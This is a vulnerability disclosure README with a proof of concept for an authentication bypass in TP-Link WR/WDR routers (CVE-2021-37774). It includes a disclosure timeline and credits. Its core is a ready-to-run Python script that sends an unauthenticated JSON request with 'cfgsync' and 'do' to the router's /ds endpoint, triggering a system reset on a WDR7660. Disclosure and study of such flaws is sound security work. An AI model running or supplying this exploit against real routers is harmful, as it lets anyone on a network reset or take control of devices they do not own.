# TP-Link-poc

TP-Link router have a Command Execute in ``httpProcDataSrv`` function.

Any user can get remote code execution through LAN, this vulnerability currently     affects latest WR,WDR series. includeing WDR7660. It affects the linux system and vxworks system. we believe there are much more models suffered from this vuln.

### Vulnerability description

This vulnerability happen when ``httpProcDataSrv`` receive a data in json format from ``HTTP post request``.If the strings ``cfgsync`` and ``do``in users input,the post json would  bypass httpDoAuthorize.

![](1.png)

![image-20210728095522755](2.png)

### Poc
Refer to this video: [wdr7660.mp4](./wdr7660.mp4)
poc&exp

***It's for WDR7660***
```python3
import sys
import requests
if len(sys.argv) != 2:
    exit()
ip = sys.argv[1]
s = requests.Session()
data = "{\"system\":{\"reset\":null},\"method\":\"do\", \"cfgsync\":{\"get_config_info\":null}}"

response = s.post("http://%s/ds" %ip, data=data)
print("Status code:   %i" % response.status_code)
print("Response body: %s" % response.content)
```

### Timeline
2021.7.27 report to CVE and TP-Link
2021.8.4 TP-LINK's security department has been in touch with me.
2023.1.11 get CVE ID：CVE- 2021-37774
### Acknowledgment
Credit to [@H4lo](https://github.com/H4lo) from Hatlab at dbappsecurity.
